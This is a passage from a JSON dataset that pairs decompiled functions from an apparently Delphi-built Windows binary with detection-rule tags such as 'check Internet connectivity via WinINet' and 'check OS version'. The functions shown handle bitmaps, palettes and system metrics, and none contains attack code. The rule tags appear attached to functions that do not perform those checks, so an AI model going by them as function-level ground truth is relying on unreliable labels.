        "decompiled_code": "\nvoid fcn.0042bbd8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((*(in_EAX + 0x32) == '\\0') || (*(in_EAX + 0x31) == '\\0')) {\n        iVar1 = *(in_EAX + 0x28);\n        if (*(iVar1 + 0xc) != 0) {\n            fcn.0042a690();\n            sub.gdi32.dll_DeleteObject(*(iVar1 + 0xc));\n            *(iVar1 + 0xc) = 0;\n        }\n        fcn.0042bb28();\n        fcn.0042bb38();\n        iVar1 = *(in_EAX + 0x28);\n        fcn.0042ba64();\n        uVar2 = fcn.0042b19c();\n        *(iVar1 + 0xc) = uVar2;\n        *(in_EAX + 0x32) = 1;\n        *(in_EAX + 0x31) = 1;\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "0042bc38": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042bc38(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.0042a690();\n    }\n    iVar2 = fcn.00427b40();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.00427444();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x0042bcc9;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x0042bcc9:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "0042bcf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bcf0(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.0042730c();\n    }\n    fcn.0042bb28();\n    fcn.004031a8();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.0042b544(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 238
    },
    "0042bd98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bd98(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42bdb4;\n    iVar1 = fcn.004037f0();\n    puStack32 = 0x42be1f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x42be0f;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.004039dc();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4858ac;\n    puStack32 = 0x42be40;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack36 = 0x42be7f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.0042a904();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.0042a900();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42be86;\n    uStack36 = 0x4858ac;\n    uStack40 = 0x42be7e;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 580
    },
    "0042bec0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042bec0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x42bef3;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x42bf18;\n    piVar1 = fcn.00402b14();\n    uStack196 = 0x42c3dd;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x42c3b0;\n    uStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.004031a8();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.004037f0();\n            if (arg_8h == 0) {\n                fcn.004031a8();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x42c046;\n            fcn.0041ec2c(in_ECX - var_20h, 0);\n            uStack224 = 0x42c056;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.00427324();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.0041ebbc();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.004275b4();\n        piVar1[8] = iVar2;\n    }\n    fcn.0041ebbc();\n    if (piVar1[5] == 0) {\n        iVar2 = fcn.004275d4();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.0042787c();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.00427444();\n    uStack224 = 0x42c32b;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x483630 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.0042bec0::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x42c2b1;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x42c2c5;\n            iVar2 = sub.kernel32.dll_GetLastError();\n            if (iVar2 == 0) {\n                puStack256 = 0x42c2ce;\n                fcn.00427324();\n            }\n            else {\n                puStack256 = 0x42c2d5;\n                fcn.0040ded0();\n            }\n        }\n        uStack260 = 0x42c2fa;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x42c2f0;\n        puStack256 = &stack0xfffffffc;\n        fcn.0041ebbc();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x42c332;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x42c32a;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x42c16d;\n    lpbInit = fcn.00402b14();\n    uStack236 = 0x42c293;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x42c18b;\n    puStack232 = &stack0xfffffffc;\n    fcn.0041ebbc();\n    uStack244 = hdc;\n    piStack248 = 0x42c194;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x42c199;\n    var_10h = fcn.00427444();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x42c1a9;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x42c1b3;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x42c1d1;\n        uStack272 = fcn.00427b40();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x42c1e3;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x42c1ef;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x42c267;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError();\n        if (iVar2 == 0) {\n            fcn.00427324();\n        }\n        else {\n            fcn.0040ded0();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x42c26e);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2160
    },
    "0042c498": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c498(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x42c4b8;\n        fcn.0042bb28();\n        puStack108 = 0x42c4c7;\n        fcn.004031a8();\n        if (param_2 != 0) {\n            puStack108 = &fcn.0042c498::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x42c4d7;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x485890) {\n            var_4h = *0x485890;\n        }\n        else {\n            puStack120 = 0x42c504;\n            var_4h = fcn.0042b138();\n        }\n        uStack124 = 0x42c533;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.0042bd98(0, 0, &fcn.0042c498::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 471
    },
    "0042c6e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c6e8(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.0042bb38();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack60 = uStack80;\n        uStack58 = uStack80;\n        fcn.0042b544(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "0042c768": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c768(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uchar auStackY256 [116];\n    uint uStackY140;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.00425384();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.0042bb28();\n            fcn.0042bb38();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.0042c768::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x42c7ce;\n            var_4h = fcn.0042aad4(0, &fcn.0042c768::var_58h);\n            uStack120 = 0x42c7ff;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            uStackY140 = 0x42c7f5;\n            puStack116 = &stack0xfffffffc;\n            fcn.0042bd98(0, &stack0xffffff00 | *(iVar1 + 0x70), &fcn.0042c768::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.0042a9cc();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 520
    },
    "0042c898": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c898(char param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iStackY1120;\n    uchar *puStackY1116;\n    char cVar5;\n    char cStack1080;\n    uchar auStack1054 [1038];\n    \n    fcn.004031a8();\n    puVar1 = *(*(in_EAX + 0x28) + 0x6c);\n    if (puVar1 == NULL) {\n        fcn.0042bab4();\n        iVar2 = *(in_EAX + 0x28);\n        if (*(iVar2 + 0x14) != 0) {\n            cVar5 = *(iVar2 + 0x50);\n            fcn.004282b8(*(iVar2 + 0x50));\n            if (*(iVar2 + 0x70) != '\\0') {\n                cStack1080 = '\\f';\n                if (*(iVar2 + 0x3e) < 9) {\n                    cStack1080 = (1 << (*(iVar2 + 0x3e) & 0x1f)) * '\\x03' + '\\f';\n                }\n            }\n            fcn.004031a8(cVar5 + cStack1080 + '\\x0e');\n            fcn.0042b978();\n            fcn.00427120();\n            sub.gdi32.dll_SelectObject(*(*(in_EAX + 0x2c) + 4), *(iVar2 + 0x14));\n            fcn.00427444();\n            sub.gdi32.dll_GetDIBColorTable(*(*(in_EAX + 0x2c) + 4), 0, 0x100);\n            iStackY1120 = *(*(in_EAX + 0x2c) + 4);\n            sub.gdi32.dll_SelectObject();\n            puVar3 = *(iVar2 + 0x50);\n            puStackY1116 = auStack1054;\n            if ((puVar3 != NULL) && (puVar3 < auStack1054)) {\n                puStackY1116 = puVar3;\n            }\n            if ((((*(iVar2 + 0x70) == '\\0') && (puStackY1116 == NULL)) && (*(iVar2 + 0x10) != 0)) &&\n               ((*(iVar2 + 0x71) == '\\0' && (puStackY1116 = fcn.00427be4(),  8 < *(iVar2 + 0x3e))))) {\n                iStackY1120 = iStackY1120 + puStackY1116 * 4;\n            }\n        }\n        if (param_1 != '\\0') {\n            fcn.0041ebf4();\n        }\n        if (iStackY1120 != 0) {\n            fcn.0042aa88();\n            if (puStackY1116 != NULL) {\n                if ((*(iVar2 + 0x50) == NULL) || (*(iVar2 + 0x50) != puStackY1116)) {\n                    *(iVar2 + 0x50) = puStackY1116;\n                }\n                if (*(iVar2 + 0x70) != '\\0') {\n                    fcn.004278c4();\n                }\n            }\n            if (*(iVar2 + 0x70) == '\\0') {\n                fcn.0041ebf4();\n                fcn.0041ebf4();\n                if ((8 < *(iVar2 + 0x3e)) && ((*(iVar2 + 0x40) & 3) != 0)) {\n                    fcn.0041ebf4();\n                }\n            }\n            else {\n                fcn.0041ebf4();\n                fcn.0041ebf4();\n            }\n            fcn.0041ebf4();\n            fcn.0041ebf4();\n        }\n    }\n    else {\n        uVar4 = (***puVar1)();\n        if (param_1 != '\\0') {\n            fcn.0041ebf4(uVar4);\n        }\n        (****(*(in_EAX + 0x28) + 0x6c))();\n        (**(*param_2 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 969
    },
    "0042ce10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ce10(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.0041e9b0(0, 0);\n        uStack32 = 0x42ce3f;\n        fcn.0041ebbc();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.00427e98(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x42ce7b;\n                fcn.00427330();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "0042ce88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ce88(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x42ceab;\n            fcn.00427330();\n        }\n        puStack32 = 0x42ceb7;\n        uVar2 = fcn.004037f0();\n        uStack36 = 0x42cf15;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0042cdd4();\n        if (iVar3 == *0x4858a8) {\n            fcn.004031a8();\n            fcn.0041ebf4();\n        }\n        else {\n            fcn.0042cdd4();\n            fcn.004283f8();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0042d180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042d180(void)\n\n{\n    char cVar1;\n    \n    *0x483608 = sub.kernel32.dll_MulDiv(8, *0x485898, 0x48);\n    *0x483608 = -*0x483608;\n    if (*(*0x484858 + 0xc) != '\\0') {\n        cVar1 = fcn.0042d13c();\n        if (cVar1 == -0x80) {\n            *0x48360f = *0x42d1e0;\n            *0x483613 = *0x42d1e4;\n            *0x483617 = *0x42d1e8;\n            *0x48361b = *0x42d1ec;\n            *0x483608 = sub.kernel32.dll_MulDiv(9, *0x485898, 0x48);\n            *0x483608 = -*0x483608;\n            *0x48360e = cVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "0042d2c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d2c8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42d2e0;\n    fcn.0042d2b0();\n    uStack32 = 0x42d369;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.00402b14();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.0042d37c();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42d370;\n    uStack32 = 0x42d368;\n    fcn.0042d2bc();\n    return;\n}\n",
        "token_count": 378
    },
    "0042d4fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042d4fc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x4858ec != 0) {\n        uVar1 = fcn.00425c78();\n        fcn.00425c78(uVar1);\n        iVar2 = fcn.0042d2c8();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0042db1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042db1c(void)\n\n{\n    uint8_t in_AL;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd8;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x42db33;\n    fcn.00404a78();\n    uStack28 = 0x42dbe6;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    if (*(in_AL + 0x485924) == '\\0') {\n        if (*0x485920 == 0) {\n            var_8h = 0;\n            puStack24 = &stack0xfffffffc;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            if (((in_AL == 0) && (puStack24 = &stack0xfffffffc,  *0x48592c == '\\0')) &&\n               (puStack24 = &stack0xfffffffc,  *0x48590c = fcn.0042db1c(),  *0x48592c == '\\0')) {\n                fcn.004045c8();\n            }\n            uVar1 = fcn.00404a88();\n            in_stack_ffffffd8 = *0x485920;\n            var_8h = sub.kernel32.dll_GetProcAddress_1(*0x485920, uVar1);\n        }\n        if ((var_8h != 0) && (in_AL != 0)) {\n            *0x48592c = '\\x01';\n        }\n        *(in_AL + 0x485924) = 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd8;\n    iStack32 = 0x42dbed;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 443
    },
    "0042dc10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042dc10(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (*0x485924 == '\\0') {\n        *0x4858fc = fcn.0042db1c();\n        (**0x4858fc)(arg_8h);\n    }\n    else {\n        iVar1 = -1;\n        if (arg_8h - 0x4cU < 2) {\n            iVar1 = 0;\n        }\n        else if (arg_8h == 0x4e) {\n            arg_8h = 0;\n        }\n        else if (arg_8h == 0x4f) {\n            arg_8h = 1;\n        }\n        else if (arg_8h - 0x50U < 2) {\n            iVar1 = 1;\n        }\n        if (iVar1 == -1) {\n            sub.user32.dll_GetSystemMetrics(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "0042dc98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
